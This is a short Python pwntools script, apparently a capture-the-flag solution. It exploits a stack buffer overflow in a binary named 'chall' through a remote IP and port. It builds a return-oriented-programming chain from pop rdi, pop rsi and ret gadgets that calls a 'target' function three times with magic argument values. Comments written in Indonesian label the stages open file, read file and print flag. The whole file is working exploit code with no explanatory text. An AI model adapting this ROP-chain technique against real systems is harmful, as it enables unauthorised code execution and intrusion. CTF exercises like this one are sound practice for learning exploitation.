from pwn import *

context.binary = './chall'
elf = context.binary

p = remote('152.118.201.241', 3015)

offset = 88

pop_rdi = 0x4011ba
pop_rsi_r15 = 0x4011c3
ret = 0x40101a

target = elf.symbols['target']

payload = b"A"*offset

payload += p64(ret)

# buka file
payload += p64(pop_rdi)
payload += p64(0xcafebabecafebabe)

payload += p64(pop_rsi_r15)
payload += p64(0xdeadc0dedeadc0de)
payload += p64(0x0)

payload += p64(target)

# baca file
payload += p64(pop_rdi)
payload += p64(0x6767676767676767)

payload += p64(pop_rsi_r15)
payload += p64(0x1337beef1337beef)
payload += p64(0x0)

payload += p64(target)

# print flag
payload += p64(pop_rdi)
payload += p64(0x4141414142424242)

payload += p64(pop_rsi_r15)
payload += p64(0x4343434344444444)
payload += p64(0x0)

payload += p64(target)

p.sendline(payload)
p.interactive()